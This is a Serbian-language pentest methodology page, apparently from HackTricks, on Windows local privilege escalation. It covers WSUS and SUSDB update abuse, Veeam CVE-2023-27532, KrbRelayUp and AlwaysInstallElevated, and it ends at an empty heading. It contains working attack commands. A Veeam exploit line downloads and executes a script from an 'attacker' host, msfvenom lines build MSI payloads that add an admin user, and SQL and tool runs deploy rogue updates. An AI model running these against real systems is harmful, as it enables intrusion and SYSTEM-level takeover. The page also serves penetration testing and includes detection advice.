# Lokalna eskalacija privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za traženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju eskalacije privilegija u Windows-u iz nekoliko temeljnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Njen praktičan tok enumeracije takođe se zasniva na radionicama i kontrolnim listama zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata prezentaciju o eskalaciji privilegija u Windows-u sa konferencije DerbyCon.<sup>[[5]](#references)</sup>

## Osnovna teorija Windows-a

### Access Tokens

**Ako ne znate šta su Windows access tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Više informacija o ACLs - DACLs/SACLs/ACEs potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

U Windows-u postoje različite stvari koje mogu **da vas spreče da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriju vaše aktivnosti**. Pre nego što počnete enumeraciju za eskalaciju privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **mehanizme odbrane**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup takođe može omogućiti da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac izmena Windows `SYSTEM` memorije:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Zaštita administratora / tiha eskalacija UIAccess-a

UIAccess procesi pokrenuti putem `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL bez upita, kada se zaobiđu provere bezbedne putanje AppInfo. Pogledajte namenski tok za zaobilaženje UIAccess/Admin Protection ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra pristupačnosti Secure Desktop-a može se zloupotrebiti za proizvoljno upisivanje u SYSTEM registar (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju za **SMB proizvoljni port**, gde se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo korišćene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti u verziji Windows-a (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za određene verzije

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu napada** koju pruža Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje OS build, instalirana ažuriranja i odabrane potencijalne kandidate iz bezbednosnih saveta; proverite tačan proizvod i ažuriranja koja su zamenila postojeća pre nego što rezultat smatrate primenljivim.

Za lokalni exploit specifičan za određenu verziju, proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` obično upućuje na 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. OS build ili kandidat za KB koji nedostaje ne dokazuje da je sistem ranjiv na exploit; uporedite pokrenuti build, instalirano ažuriranje ili ažuriranje koje ga je zamenilo, arhitekturu procesa i preduslove za exploit sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

Primer korupcije memorije servisa potražite u odeljku o [offsetima klijentski kontrolisanog MIDI prstena deljene memorije](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Objavljeni offseti steka važe samo za testirani build; dostizanje nivoa `LOCAL SERVICE` razlikuje se od narednog koraka [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) do `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploit-a:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neke akreditivne/Juicy informacije sačuvane u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell istorija

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično zapisuje datoteke u fasciklu Documents svakog korisnika, ali podešavanje `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri datoteke u zajedničku ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu putanju za izlaz i ACL datoteke: ona može da sadrži argumente komandi i njihov izlaz, uključujući akreditive. Transkript kojem možete da pristupite predstavlja trag samo ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku dokumentacije „Transcript files“ i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell evidencija, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i celokupan sadržaj izvršavanja skripte, čime se obezbeđuje dokumentovanje svakog bloka koda tokom njegovog izvršavanja. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenzičku analizu i analiziranje zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji za Script Block mogu se pronaći u Pregledaču događaja u Windows-u, na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Podešavanja interneta

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ranije smernice su rizik sažele ovako:

Možete kompromitovati sistem ako se ažuriranja zahtevaju preko http, a ne preko http**S**.

WSUS endpoint koji koristi HTTP razlog je za proveru mogućeg presretanja metapodataka ažuriranja. Eksploatacija zavisi i od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne dokazuje da je moguće izvršiti kod. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranja bez SSL-a tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od sledećih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Prvobitna izjava o primenljivosti glasila je:

Onda je **moguće iskoristiti ranjivost.** Ako je vrednost poslednjeg registra jednaka `0`, unos za WSUS će biti zanemaren.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Time se potvrđuje preduslov za putanju presretanja HTTP saobraćaja, ali se ne dokazuje da je presretanje moguće, da će zlonamerno ažuriranje biti prihvaćeno ili da može da se instalira sa povišenim privilegijama. Kada je postavljen na `0`, ta konkretna WSUS krajnja tačka nije izabrana ovom politikom.

Da biste iskoristili ove ranjivosti, možete da koristite alate kao što su [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su MiTM skripte za eksploataciju kojima se u WSUS saobraćaj koji nije zaštićen SSL-om ubacuju „lažna“ ažuriranja.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Kompletan izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Ukratko, ovo je greška koju ova ranjivost iskorišćava:

> Ako možemo da izmenimo proxy podešavanja svog lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorer-a, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod kao korisnik sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako napravimo samopotpisani sertifikat za WSUS ime hosta i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za proveru sertifikata po principu „veruj pri prvom korišćenju“. Ako korisnik veruje predstavljenom sertifikatu i on sadrži ispravno ime hosta, usluga će ga prihvatiti.

Ovu ranjivost možete da iskoristite alatom [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja koja kontroliše WSUS administrator

Postoji zaseban način napada kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sve delegirane WSUS dozvole, pa utvrdite koja grupa računara klijenata bi primila odobreno ažuriranje. [Microsoft zahteva privilegije WSUS Administrator za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putem za eskalaciju privilegija, potvrdite da je kandidat za ažuriranje potpisan i prihvaćen, da se odnosi na cilj i da se instalira u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju te uslove.

### Zloupotreba prilagođenih ažuriranja u SUSDB: nepotpisani payload-i preko `.txt`/`.esd`

Ovo je zaseban propust u granici poverenja, različit od presretanja HTTP veze sa WSUS-om: preduslov je dovoljan pristup **uskladištenim procedurama baze WSUS-a (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način da se dođe do pristupa jeste prosleđivanje naloga računara WSUS servera ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; tačni preduslovi zavise od konkretnog okruženja, pa najpre proverite dozvole `EXECUTE` umesto da pretpostavite da su neophodna administratorska prava za SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje autentifikaciju WSUS klijenta sa HTTP/8530 na LDAP, SMB ili AD CS pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potvrdite relay ka eksternoj bazi podataka i dozvole za procedure

U okruženjima u kojima WSUS koristi eksterni SQL Server, najpre proverite da li nalog WSUS servera može da se autentifikuje na bazi podataka i da li NTLM relay stiže do tog listener-a. SQL rola servera może da omogući pristup procedurama za objavljivanje ažuriranja čak i kada su direktni upisi u tabele zabranjeni; neuspešan `UPDATE` nad `SUSDB` ne dokazuje da je objavljivanje onemogućeno. Pre pokušaja objavljivanja prilagođenog ažuriranja, u ovlašćenoj SQL sesiji proverite efektivni identitet, članstvo u rolama i dozvole nad procedurama.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Aktivne definicije procedura i instalirani `SoftwareDistributionPackage.xsd` korisni su pri rekonstrukciji ispravnih metapodataka za ažuriranje. Nadređeni bundle i podređeni payload zahtevaju `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vraća svaki poziv `spImportUpdate` i održavajte doslednost veze između bundle-a, digest-a, veličine, URL-a sadržaja i revizije. Ovo je proces objavljivanja sa stanjem, pa jedan uspešan poziv uskladištene procedure nije dokaz izvršavanja na strani klijenta.<sup>[[38]](#references)</sup>

#### Izgradite, usmerite i odobrite ažuriranje

Tok rada za prilagođena ažuriranja koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvezite metapodatke ažuriranja | `spImportUpdate` |
| Sačuvajte XML fragmente za preduslove, lokalizovane i proširene podatke | `spSaveXMLFragment` |
| Povežite digest sadržaja sa URL-om pod kontrolom napadača | `spSetBatchURL` |
| Nabrojte/kreirajte grupu računara i dodajte klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobrite instalaciju za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, digest-i, veličina i handler `CommandLineInstallation` moraju da se podudaraju u uvezenim metapodacima/fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda približno ovako; koristite nove identifikatore ažuriranja, grupe i instalacije, umesto da ponovo koristite GUID-ove iz primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje provere potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja .NET funkcije `VerifyFile` postavlja zastavicu za proveru sertifikata na false kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se zatim preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili ispravna ESD slika. Zato neizmenjeni PE fajl, nazvan, na primer, `payload.exe.txt`, može proći proveru sadržaja i kasnije biti pokrenut putem rukovaoca za instalaciju ažuriranja koji koristi komandnu liniju. Ovo je greška u politici/proveri tipa, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Priprema i automatizacija kompatibilni sa BITS

Poziv `spDeployUpdate` nalaže WSUS-u da preuzme registrovani sadržaj. Izvorni server mora da ispuni očekivanja BITS-a u pogledu HTTP-a: sama dostupnost URL-a nije dovoljna, jer prenos koristi početni niz `HEAD`/`GET` zahteva i zahteve za opseg bajtova. Server koji ne podržava Range izaziva WSUS sinhronizacioni događaj `EventId=364` sa porukom da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/group/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za pripremu sadržaja. Minimalni primer pokretanja u ovlašćenom laboratorijskom okruženju:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nepraćeno izvršavanje i postojanost kroz ponovne pokušaje

Interakcija na klijentskoj strani zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema podešenom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili je ostalo nedovršeno odmah je ponovo ponuđen nakon što je callback proces završio, pa ponašanje pri ponovnim pokušajima može postati postojanost kroz ponavljano izvršavanje; to je upadljivo jer klijent prikazuje stanje neuspešnog ažuriranja.<sup>[[39]](#references)</sup>

#### Mogućnosti za detekciju i ojačavanje bezbednosti

Korisne mogućnosti za proveru na serveru i klijentu u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payload-e za ažuriranje sa ekstenzijom `.txt`/`.esd` i implementacije koje izvršavaju neočekivani principal-i (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; povežite verifikaciju sa ekstenzijom payloada i njegovim stvarnim formatom, umesto da verujete sufiksu.
- Tražite slučajeve u kojima instalacija Windows Update-a stalno ne uspeva ili se ponavlja, kao i PE izvršavanje ili neočekivanu aktivnost child procesa/mreže iz sadržaja sa nazivima koji se završavaju na `.txt` ili `.esd`.
- Tamo gde je podržano, zahtevajte Extended Protection for Authentication na servisu baze podataka i ograničite mrežni pristup bazi na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` dozvole nad procedurama za prilagođena ažuriranja na minimum i revidirajte ih.

## Alati za automatsko ažuriranje trećih strana i Agent IPC (local privesc)

Mnogi agenti u preduzećima izlažu IPC interfejs na localhost-u i privilegovani kanal za ažuriranje. Ako se registracija može usmeriti na server napadača, a alat za ažuriranje veruje zlonamernom root CA sertifikatu ili ima slabe provere potpisnika, lokalni korisnik može isporučiti zlonamerni MSI koji SYSTEM servis instalira. Pogledajte uopštenu tehniku (zasnovanu na lancu Netskope stAgentSvc – CVE-2025-0309) ovde:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Originalni opis specifičan za verziju i beleška o izviđanju glasili su:

Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401** koji obrađuje poruke pod kontrolom napadača, omogućavajući izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Izviđanje**: potvrdite listener i verziju, npr. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni servis za pravljenje rezervnih kopija na **TCP/9401**. [Veeam-ovo upozorenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze podataka sa konfiguracijom unutar perimetra mreže za pravljenje rezervnih kopija; zaseban javni PoC demonstrira putanju do izvršavanja komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može biti vezan za adresu koja nije localhost, zato proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` predstavljaju naznake, ali nisu potpuna provera zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; prethodna izdanja su pogođena. Četvorodelna verzija datoteke sama po sebi ne može da razlikuje nezakrpljeni osnovni build od kasnije zakrpe na istim brojevima build-a. Pre nego što build na granici verzija proglasite ispravljenim, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Eksploatacija**: smestite PoC, kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog soketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis izvršava komandu kao SYSTEM.

Citirani PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.

## KrbRelayUp

Prvobitni opis podrazumevanog okruženja glasio je:

U Windows okruženjima **domena** postoji ranjivost **lokalne eskalacije privilegija** pod određenim uslovima. Ti uslovi uključuju okruženja u kojima **nije nametnut LDAP signing**, korisnici imaju prava nad sopstvenim objektima koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)** i mogu da kreiraju računare u domenu. Važno je napomenuti da su ovi **zahtevi** ispunjeni uz korišćenje **podrazumevanih postavki**.

Lokalni Kerberos relay može da omogući prelaz sa prijavljivanja sa nižim privilegijama na privilegovani upis u direktorijum, ako se odgovarajući COM server autentifikuje i prosleđeni principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih puteva. RBCD lanac zahteva odgovarajuća prava za delegiranje i nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis ključa akreditiva i KDC koji podržava putanju autentifikacije putem sertifikata. Nijedna od ovih putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za prosleđeni identitet i nivoe autentifikacije i impersonation-a izabrane COM klase. Bitni su tip prijavljivanja pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivnog ili new-credentials logon-a. Firewall/OXID rutiranje i instalirana ažuriranja takođe mogu da utiču na rezultat. Permisivnu smernicu ili odgovarajući ACL tretirajte kao nešto što treba proveriti; pasivno enumerisanje ne bi trebalo da pokreće COM coercion, relay autentifikaciju ni upise u direktorijum. Shadow credential mašinskog naloga može da dovede do mašinskog tiketa i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Više informacija o toku napada potražite na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvrše) datoteke `*.msi` kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter session, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Pomoću komande `Write-UserAddMSI` iz Power-Up-a napravite u trenutnom direktorijumu Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI installer koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

